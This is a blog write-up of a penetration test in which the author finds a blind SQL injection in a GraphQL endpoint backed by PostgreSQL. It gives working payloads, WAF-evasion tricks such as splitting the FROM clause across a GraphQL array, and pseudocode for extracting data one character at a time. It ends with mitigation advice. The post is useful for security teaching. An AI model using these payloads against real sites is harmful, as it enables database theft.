---
layout: post
title:  "My SQLi adventure or: why you should make sure your WAF is configured properly"
date:   2022-01-25 13:37:00
categories: Web
---
<p>
In August 2021 I was tasked with performing a Web Application security assessment for a large client.
The automated scanning tool returned a possible SQL injection which, just like last time, couldn't be exploited using the said tool.
The reason was Cloudflare's WAF and more specifically its SQL Injection filter.
</p>

#### Disclaimer
<p>
The techniques described below do not compose a "universal" bypassing technique as the one
I've discovered previously and described <a href="https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html">here</a>. Definitely not all of them are applicable against a fully configured Cloudflare WAF instance.
<br />
It is more accurate to say that this post describes my SQLi adventure from start to finish. During this I thought that I had bypassed Cloudflare WAF's SQLi filter. It turned out that the Cloudflare installation was not properly configured (some rules in the "OWASP Uri SQL Injection Attacks" Rule Set were not enabled). For this reason the findings were rejected for Cloudflare's bug bounty program. I feel, however, that the findings described in this post are interesting and show a number of points that security people need to notice when deploying security protections for their apps. Some partial findings might also come in handy to a person who tries to bypass WAFs in general. An attacker could leverage one or several techniques, depending on the end application, to bypass some WAFs and exfiltrate data by abusing an SQLi vulnerability.
<br />
Read below and I believe you will understand what I'm talking about.
</p>

#### Details about the application
<p>
The purpose of this web application is not important for the writeup. The stack on which it is written is not really important either,
except for the /graphql endpoint which is exposed on the server, and the PostgreSQL service running the queries. GraphQL is a query language which processes a query and, in this case,
runs the appropriate SQL queries on the backend and returns the data requested. I've never used or read about GraphQL before this assessment,
so I followed the <a href="https://graphql.org/learn/">official tutorial</a> which gave me a basic understanding.
</p>
<p>
The queries are formed similarly to JSON objects. The application sends a POST request to the /graphql endpoint. The request body
contains the GraphQL query and looks something like this:
</p>

{% highlight http %}
POST /graphql HTTP/1.1
Host: *****
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Cookie: authtoken=*****

{"query":
	"query ($email:String!,$isValid:Boolean!,$name:Name ) {
		emailInUse(email:$email, isValid:$isValid, name:$name) 
	}",
"variables": {
	"isValid":false, "name":"george", "email":"X-MARK"}
}
{% endhighlight %}

<p>
The unsanitized parameter at <b>X-MARK</b> is passed from GraphQL and replaced in a PostgreSQL stored procedure, thus allowing us to inject into an SQL query that
executes on the backend server.
<br />
This is pretty much what we have to know at this point about the application. In the sections following I lay out the observations I made
while testing the application for the SQL injection and which led me to successful exploitation, including bypass of the Cloudflare SQLi filter.
</p>

#### Observation 1
<p>The first important observation made is that the server responds differently to a valid email input (i.e. when the SQL query returns data) than it does to an invalid one.
The HTTP code returned is always 200, but the response body differs:
</p>

This returns &quot;OK&quot;:
{% highlight sql %}
SELECT c1,c2,c3 FROM t1 WHERE 'a'='a';
{% endhighlight %}

This returns &quot;NOT OK&quot;:
{% highlight sql %}
SELECT c1,c2,c3 FROM t1 WHERE 'a'='b';
{% endhighlight %}

<p>
This might not look like much at first, but it was actually the mechanism that allowed me to validate the existence of specific data in the database.
It led me to the idea to perform a Blind SQL injection attack leveraging this mechanism and automate it with a script.
The script constructs a payload and sends it with the
POST request, which in its turn modifies the SQL query which runs on the backend server. 
<br />
The process is described using steps below:
<ul>
<li>We have a set of characters, called an <i><code>alphabet</code></i> This set includes all possible characters which can be part of a piece
of data we are trying to extract from the database.</li>
<li>Assume that <i><code>resource</code></i> is the SQL resource required to be retrieved. It can be the DB name, the username, a cell value in any table etc.</li>
<li>The <i><code>resource</code></i> will be retrieved character-by-character. The character we are trying to retrieve is called <i><code>char</code></i>.</li>
<li>We loop through the <i><code>alphabet</code></i> and we compare each of its letters against <i><code>char</code></i>.</li>
<li>If there is a match we log the result and move to the next <i><code>char</code></i>.</li>
<li>At the end we have the complete <i><code>resource</code></i> by concatenating all the <i><code>chars</code></i>.</li>
</ul>
</p>

#### Observation 2
<p>
The second important observation, which made things for me a lot easier, is the error message displayed in cases where 
the SQL query performed was malformed. The error message did not allow me to perform an Error-Based SQL injection,
but instead displayed the full SQL query performed on the SQL server by PostgreSQL. It will become evident why this is important in a bit.
<br />
The SQL query extracted from the error message looked something like this:
</p>

{% highlight sql linenos %}
SELECT t1.*
FROM table1 AS t1 LEFT JOIN table2 AS t2
	ON t2.id = t1.id
	AND t2.q_id IN (1, 2, 3, 4)
	AND t2.input = LOWER('X-MARK')
WHERE 
	t1.deleted_at IS NULL
	AND t1.name = $1
	AND (
		LOWER(t1.email) = LOWER('X-MARK')
		OR LOWER(t2.input) = LOWER('X-MARK')
	);
{% endhighlight %}

<p>
The user input that was submitted as the 'email' variable is reflected at the X-MARK.
These are the two reasons that having the full SQL query was important for the exploitation process:
<ol>
<li>One can see that the user input is wrapped in parentheses. This piece of information makes payload production process much easier, 
as one would know that the input must contain the closing parenthesis that matches the opening parenthesis, in order for the end SQL query to be valid.</li>
<li>User input is reflected in multiple places in the query (lines 5, 10, 11). What gave me some trouble was line #5. If it were
the case where X-MARK was only reflected inside the WHERE clause, things would've been easier. But in this case I had to make sure 
that my input didn't mess up the table JOIN. This was necessary in order to make sure the correct table rows were produced and
queried against, so that I could get the data I wanted.</li>
</ol>
<span class="note">NOTE:</span> The $1 sign on line #8 is a positional argument for the SQL prepared query and is substituted by the 'name' variable parameter
of the HTTP Request. It was not vulnerable to SQL injection though.
</p>

#### First attempt
<p>
I started by trying to find the name of the current database. The SQL query to do this in PostgreSQL is:
{% highlight sql %}
SELECT current_database();
{% endhighlight %}
</p>

<p>
There was a lot to take into consideration and it got wild from the beginning.<br />
I had to come up with ways to bypass Cloudflare right from the beginning.
</p>

<h5>WAF Bypass #1</h5>
<p>
First of all, I had to start with comparing the first character of current_database() with
the character 'a'. The way to do this is PostgreSQL is:

{% highlight sql %}
SELECT 'a' = SELECT substr(current_database(), 1, 1);
{% endhighlight %}

Cloudflare blocks the 'substr' function, so the trick is to use either the 'left' or 'right' function.
I used the 'right' function for this because 'left' gave me some trouble when trying to figure out when I had
found all of the database name's characters. The new query (which compares 'a' with the <u>last</u> resource's character
looks like this:

{% highlight sql %}
SELECT 'a' = SELECT right(current_database(), 1);
{% endhighlight %}

and goes by undetected by the WAF.
</p>

<p>
<span class="note">NOTE:</span> The function right(current_database(), N) returns the N rightmost characters of the
database name. Because of this, when the last character is found to be, for example, <b>X</b>, the next call to the function should be:
</p>

{% highlight sql %}
SELECT 'aX' = SELECT right(current_database(), 2);
{% endhighlight %}

<p>
Since we already know that we have to close an opening parenthesis in the query (from Observation #2), the body of the
POST Request looks like this (only showing the 'email' variable here):
</p>

{% highlight json %}
...
 "email":"a@b.c') AND ('a'=(SELECT(right((SELECT current_database()),1)))) AND ('a'='a"}
}
{% endhighlight %}

<p>
However, remembering how the backend SQL query includes a JOIN clause (from Observation #2), I also added some extra
stuff in the query to make sure the SQL Join was executed correctly in the background. The body
of the POST request looked like this:
</p>

{% highlight json %}
...
 "email":"a@b.c' OR t2.id = t1.id AND t2.q_id IN (1, 2, 3, 4) AND ('a'=(SELECT(right((SELECT current_database()),1)))) AND ('a'='a"}
}
{% endhighlight %}

<p>
The subsequent SQL query on the server looked like this:
</p>

{% highlight sql linenos %}
SELECT t1.*
FROM table1 AS t1 LEFT JOIN table2 AS t2
	ON t2.id = t1.id
	AND t2.q_id IN (1, 2, 3, 4)
	AND t2.input = LOWER('a@b.c') OR t2.id = t1.id AND t2.q_id IN (1, 2, 3, 4) AND ('a'=(SELECT(right((SELECT current_database()),1)))) AND ('a'='a')
WHERE 
	t1.deleted_at IS NULL
	AND t1.name = $1
	AND (
		LOWER(t1.email) = LOWER('a@b.c') OR t2.id = t1.id AND t2.q_id IN (1, 2, 3, 4) AND ('a'=(SELECT(right((SELECT current_database()),1)))) AND ('a'='a')
		OR LOWER(t2.input) = LOWER('a@b.c') OR t2.id = t1.id AND t2.q_id IN (1, 2, 3, 4) AND ('a'=(SELECT(right((SELECT current_database()),1)))) AND ('a'='a')
	);
{% endhighlight %}

<p>
It's complicated, but the idea remains the same: if 'a' is the rightmost character of the Database name, we'll get an "OK"
response from the server.
</p>

<p>
Anyway, after submitting this request to the server, I saw the dreaded page of the (misconfigured) Cloudflare WAF telling me that my
request was blocked. Time for some more fiddling!
</p>

#### Second attempt
<p>
Before I gave it another go, I had to understand what was Cloudflare's issue with my query.
<br />
After some trial and error I figured out that the problem was the spaces in the FROM clause in the resulting server SQL query. This lead me to the
second WAF bypass.
</p>

<h5>WAF Bypass #2</h5>
<p>
The second WAF bypass technique utilized here eliminates spaces in the SQL query and encloses the parts of the SQL FROM clause
in parentheses. In short:
</p>
{% highlight sql %}
SELECT col FROM tab WHERE a='a' AND b='b';
{% endhighlight %}

becomes

{% highlight sql %}
SELECT(col)FROM tab WHERE(a='a')AND(b='b');
{% endhighlight %}

So the resulting body of the POST request becomes:

{% highlight json %}
...
 "email":"a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT current_database()),1))))AND('a'='a"}
}
{% endhighlight %}

and the subsequent SQL query on the server looks like this:

{% highlight sql linenos %}
SELECT t1.*
FROM table1 AS t1 LEFT JOIN table2 AS t2
	ON t2.id = t1.id
	AND t2.q_id IN (1, 2, 3, 4)
	AND t2.input = LOWER('a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT current_database()),1))))AND('a'='a')
WHERE 
	t1.deleted_at IS NULL
	AND t1.name = $1
	AND (
		LOWER(t1.email) = LOWER('a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT current_database()),1))))AND('a'='a')
		OR LOWER(t2.input) = LOWER('a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT current_database()),1))))AND('a'='a')
	);
{% endhighlight %}

<p>
The whole process could be (and was) automated at this point to find the whole value of the database
name. The same process also retrieved the username (by using the <b>user</b> function) and the database version
(by using the <b>version()</b> function). But what about data that was stored in the database tables? The generic
query to retrieve these data, as well as the query using the bypass methods I used in my 
<a href="https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html">previous article</a> were 
not working. Both were blocked:
</p>

{% highlight sql %}
SELECT col FROM tab WHERE a='a';
SELECT/*trick comment*/ col FROM/*trick comment*/ tab WHERE/*trick comment*/ a='a';
{% endhighlight %}

<p>
Why were my queries blocked? The problem is the <b>FROM</b> clause that comes right after the <b>SELECT</b>
clause. The following query would pass through the (misconfigured) Cloudflare WAF SQLi filter just fine:
</p>

{% highlight sql %}
SELECT col FROM tab;
{% endhighlight %}

<p>
As soon as the <b>WHERE</b> clause was introduced at the end of the query, the WAF would kick in and block the request.
My ultimate goal was to retrieve data from any table. It was time to dig deeper into the rabbit hole.
</p>

#### (Kinda sidetracked) Third attempt
<p>
I'm giving here an early failed attempt for the SQLi, just because I'd like for this post to
show people how the thought process unfolds during a pentest.<br />
In my attempt to decomplicate things (i.e. break away from all the <b>JOIN</b> and <b>FROM</b> clauses), I put to use a simple
semicolon and comment trick (;--). The plan was to first retrieve the database name and then build on from there to retrieve
data in tables:
</p>

{% highlight json %}
...
 "email":"a@b.c')OR('a'=(SELECT(right((SELECT database_name()),1))))AND('a'='a');--"}
}
{% endhighlight %}

The resulting SQL query on the server is the following:

{% highlight sql linenos %}
SELECT t1.*
FROM table1 AS t1 LEFT JOIN table2 AS t2
	ON t2.id = t1.id
	AND t2.q_id IN (1, 2, 3, 4)
	AND t2.input = LOWER('a@b.c')OR('a'=(SELECT(right((SELECT database_name()),1))))AND('a'='a');--')
WHERE 
	t1.deleted_at IS NULL
	AND t1.name = $1
	AND (
		LOWER(t1.email) = LOWER('a@b.c')OR('a'=(SELECT(right((SELECT database_name()),1))))AND('a'='a');--')
		OR LOWER(t2.input) = LOWER('a@b.c')OR('a'=(SELECT(right((SELECT database_name()),1))))AND('a'='a');--')
	);
{% endhighlight %}

<p>
Anyway, this of course doesn't work for two reasons:
<ol>
<li>Everything after line #5 is ignored because of the comment. This is not necessarily limiting, but I'd rather perform my SQLi inside the <b>FROM</b> clause.</li>
<li>I get the following error: "bind message supplies 1 parameters, but prepared statement requires 0". This is because the <b>name</b> variable is passed
to the prepared statement but line #8 is ignored so the new prepared statement does not expect the variable.</li>
</ol>
</p>

#### Fourth attempt
<p>
I'm giving here another early attempt of mine to retrieve data from a table, that got me closer to my goal. What I knew until this point was that the following payload
would get blocked by the WAF:
</p>

{% highlight json %}
...
 "email":"a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT column1 FROM table1 LIMIT 1 OFFSET 0),1))))AND('a'='a"}
}
{% endhighlight %}

<p>
<span class="note">NOTE:</span> I added the <b>LIMIT</b> and <b>OFFSET</b> keywords in order to retrieve only one row from table1.
<b>LIMIT</b> indicates that we only want one row retrieved and <b>OFFSET</b> indicates how many rows we want to skip before starting retrieving data.
In this case <b>OFFSET 0</b> indicates that the database should skip 0 rows and return the first row in table1. This is useful in order to retrieve
all the table's rows one-by-one.
</p>

<h5>WAF Bypass #3</h5>
<p>
Looking back at the SQL query retrieved from the error produced by the database server, I noticed that using
the <b>FROM</b> clause might not be necessary. The table1 table is aliased as t1 in the query using the <b>AS</b>
keyword, and any of its columns can be referenced based on t1. You can query the column column1 of table1 as such:
</p>

{% highlight sql %}
SELECT t1.column1;
{% endhighlight %}

This passes through the (misconfigured) Cloudflare WAF just fine and thus the payload in the body of the POST
request can be transformed as such:

{% highlight json %}
...
 "email":"a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT t1.column1 LIMIT 1 OFFSET 0),1))))AND('a'='a"}
}
{% endhighlight %}

The subsequent SQL query on the server looks like this:

{% highlight sql  %}
SELECT t1.*
FROM table1 AS t1 LEFT JOIN table2 AS t2
	ON t2.id = t1.id
	AND t2.q_id IN (1, 2, 3, 4)
	AND t2.input = LOWER('a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT t1.column1 LIMIT 1 OFFSET 0),1))))AND('a'='a')
WHERE 
	t1.deleted_at IS NULL
	AND t1.name = $1
	AND (
		LOWER(t1.email) = LOWER('a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT t1.column1 LIMIT 1 OFFSET 0),1))))AND('a'='a')
		OR LOWER(t2.input) = LOWER('a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT t1.column1 LIMIT 1 OFFSET 0),1))))AND('a'='a')
	);
{% endhighlight %}

<p>
This works fine, but the limitation is that only data from table1 (or table2) can be extracted, as these are the only tables
aliased in the server SQL query.
Moving on to the final, successful attempt.
</p>

#### Final (and successful) attempt
<p>
All right, if I wanted to retrieve any piece of data I wanted from the database, I had to put aside WAF bypass technique #3.
At this point it looked like there was no way to avoid using the <b>FROM</b> clause. It also looked like there
was no way to successfully conceal the <b>FROM</b> clause into the payload without it being detected by Cloudflare's WAF. Great.
It seemed like the answer to was I was looking for was not in the SQL query. I had to take a step back.
</p>

<h5>Enter GraphQL</h5>
<p>
We've seen that the body of the request sent was a GraphQL query, which was then translated into an SQL query.
So my next attempt was to mutate the GraphQL query and somehow manage to conceal the <b>FROM</b> clause in there,
which would hopefully translate as a working SQL query on the server.
<br />
As I mentioned before a GraphQL query is structured similarly to a JSON object.
Data in JSON is stored in a dictionary as name/value pairs which are both strings. GraphQL queries require
string keys but allow arbitrary parameters. These rules apply to GraphQL:
<ul>
<li>Data is separated by commas</li>
<li>Curly braces hold objects</li>
<li>Square brackets hold arrays</li>
</ul>
</p>

<p>
So a GraphQL query parameter could look like any of the following ways:
</p>

{% highlight json %}
...
 "name":"George"}
}
{% endhighlight %}

{% highlight json %}
...
 "name":{
   "a":"a",
   "b":"b"
  }
 }
}
{% endhighlight %}

{% highlight json %}
...
 "name":["George", "Skouroupathis"]}
}
{% endhighlight %}

<p>
This got me thinking: what happens to the SQL query on the backend server if I pass the value of the object as an array instead
of a string. In short, I wanted to break the SQL injection query and move the <b>FROM</b> clause to a different object
in order to trick Cloudflare.
</p>

I turned this
{% highlight json %}
...
 "email":"a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT column1 FROM table1 LIMIT 1 OFFSET 0),1))))AND('a'='a"}
}
{% endhighlight %}

into this
{% highlight json %}
...
 "email":["a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT column1", "FROM table1 LIMIT 1 OFFSET 0),1))))AND('a'='a"]}
}
{% endhighlight %}

<p>
The request bypassed the WAF and I got an error back from the database, complaining about a malformed SQL query and showing me
the full resulting SQL query. The query at the injection point looked like this:

{% highlight sql %}
...
LOWER(t1.email) = LOWER('a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT column1, FROM table1 LIMIT 1 OFFSET 0),1))))AND('a'='a')
...
{% endhighlight %}
</p>

<p>
Notice the comma (,) right after <b>SELECT column1</b>? That was my golden ticket out of the SQLi-filtering hell.
Passing the value of the GraphQL query parameter as an array is translated as a string in the backend SQL server. The string
is simply the concatenation of the array's items separated by a comma and a space character! The SQL query was malformed at this point, but I could
comment out the commas and have a valid, WAF-bypassing request, that retrieved whatever data I wanted from
whichever database table I chose to!
</p>

<p>
This is the body of the final POST request:
</p>
{% highlight json %}
...
 "email":["a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT column1/*", "*/FROM table1 LIMIT 1 OFFSET 0),1))))AND('a'='a"]}
}
{% endhighlight %}

and the resulting valid SQL query on the SQL server:

{% highlight sql  %}
SELECT t1.*
FROM table1 AS t1 LEFT JOIN table2 AS t2
	ON t2.id = t1.id
	AND t2.q_id IN (1, 2, 3, 4)
	AND t2.input = LOWER('a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT column1/*, */ FROM table1 LIMIT 1 OFFSET 0),1))))AND('a'='a')
WHERE 
	t1.deleted_at IS NULL
	AND t1.name = $1
	AND (
		LOWER(t1.email) = LOWER('a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT column1/*, */ FROM table1 LIMIT 1 OFFSET 0)),1))))AND('a'='a')
		OR LOWER(t2.input) = LOWER('a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT column1/*, */ FROM table1 LIMIT 1 OFFSET 0)),1))))AND('a'='a')
	);
{% endhighlight %}

<p>
It worked!
</p>

#### Full Speed Ahead
<p>
To make the table retrieving process easier, I wrote a script in Python to automate the process. The pseudocode of the script
goes something like this:
</p>

{% highlight python %}
# assert names of columns and table name is known
alphabet = [a,b,c,...,y,z]
valueRetrieved = ""
numOfCharsFound = 0
for rowNumber in [0,20]:
  for columnName in columns:
    for character in alphabet:
      sqlInjection = '''
        a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('{character} + {valueRetrieved}'=(SELECT(right((SELECT {columnName}/*", "*/FROM tableName LIMIT 1 OFFSET {rowNumber}),{numOfCharsFound}+1))))AND('a'='a
      '''

      inject sqlInjection in POST request body
      if response.body == "OK":
        valueRetrieved = character + valueRetrieved
        recurse function with numOfCharsFound++
      elif response.body == "NOT OK":
        continue with next character in alphabet

      return valueRetrieved
{% endhighlight %}


And this is how I exploited GraphQL to craft an SQL injection that bypassed a misconfigured Cloudflare WAF instance
and was able to retrieve the whole database in the back end. As I mentioned in the beginning, this combination of bypassing techniques do not work against a properly-configured Cloudflare WAF.


#### Mitigation

The safest way to mitigate SQL injections on your databases is prepared statements. These come in most database interaction libraries for most languages. You can find a full list of ways to mitigate SQL injections at [OWASP][owasp-sql].
<p>
I mentioned this last time, but it is my opinion that the shift-left approach is of the greatest importance when developing software.
You can spend lots of money and time configuring IDSs, WAFs and controls in general, but the most important thing is for developers 
to give the appropriate attention to the security of the applications they are developing (or even better have a penetration tester have a go at it).
</p>
<p>
PS: Don't forget to sanitize your users' input.
</p>

[cf-hof]: https://hackerone.com/gskourou
[owasp-sql]:    https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
